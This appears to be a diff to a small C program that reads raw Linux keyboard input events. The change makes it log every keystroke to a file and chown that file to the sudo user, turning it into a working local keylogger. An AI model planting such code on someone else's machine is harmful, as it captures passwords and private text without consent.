@@ -20,6 +20,21 @@ int main(int argc, char** argv) {
         exit(-1);
     }
 
+    int writeFd = open("log.txt", O_CREAT | O_WRONLY, 0666);
+
+    if(writeFd == -1) {
+        printf("There was an error opening log file");
+        exit(-1);
+    }
+
+    char *sudo_uid = getenv("SUDO_UID");
+    char *sudo_gid = getenv("SUDO_GID");
+    if (sudo_uid && sudo_gid) {
+        uid_t uid = (uid_t)atoi(sudo_uid);
+        gid_t gid = (gid_t)atoi(sudo_gid);
+        fchown(writeFd, uid, gid);
+    }
+
     while(1) {
         struct input_event ie;
         read(fd, &ie, sizeof(ie));
@@ -28,7 +43,11 @@ int main(int argc, char** argv) {
             continue;
         }
 
-        printf("%c", codeToChar(ie.code));
+        char c = codeToChar(ie.code);
+
+        printf("%c", c);
+        write(writeFd, &c, sizeof(c));
+        fsync(writeFd);
         fflush(stdout);
     }
 }
@@ -38,7 +57,7 @@ char codeToChar(int code) {
         return '0';
     }
 
-    if(code >= 1 && code <= 9) {
+    if(code > 1 && code <= 10) {
         return code + 48 - 1;
     }
 
